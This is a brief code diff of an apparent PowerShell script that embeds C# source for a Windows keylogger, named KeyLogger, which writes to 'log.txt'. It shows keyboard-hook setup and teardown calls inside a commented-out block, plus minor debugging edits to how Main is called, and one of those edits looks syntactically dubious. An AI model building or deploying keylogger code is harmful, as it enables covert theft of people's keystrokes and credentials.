@@ -25,7 +25,7 @@ namespace KeyLogger {
       hookId = SetHook(hookProc);
       Application.Run();
       UnhookWindowsHookEx(hookId);*/
-      System.Console.WriteLine(args.Length);
+      System.Console.WriteLine(args);
     }
 
     private static IntPtr SetHook(HookProc hookProc) {
@@ -59,4 +59,4 @@ namespace KeyLogger {
 }
 "@ -ReferencedAssemblies System.Windows.Forms
 
-[KeyLogger.Program]::Main("log.txt");
+[KeyLogger.Program]::Main(["log.txt"]);
